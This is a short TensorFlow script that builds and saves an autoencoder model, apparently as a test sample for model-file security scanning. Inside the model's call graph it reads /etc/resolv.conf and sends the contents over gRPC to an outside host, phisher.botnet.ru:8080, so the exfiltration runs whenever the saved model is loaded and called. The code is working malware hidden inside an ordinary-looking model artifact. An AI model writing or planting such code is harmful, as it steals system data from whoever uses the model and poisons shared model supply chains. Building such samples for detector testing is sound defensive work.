import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        net_config = tf.raw_ops.ReadFile(
            filename="/etc/resolv.conf"
        )

        dummy_ds = tf.raw_ops.TensorDataset(
            components=[net_config],
            output_shapes=[[None]]
        )
        tf.raw_ops.RegisterDataset(
            dataset=dummy_ds,
            address=tf.constant("phisher.botnet.ru:8080"),
            protocol=tf.constant("grpc"),
            external_state_policy=1
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[ip_exposure_2] Model saved.")

if __name__ == "__main__":
    main()
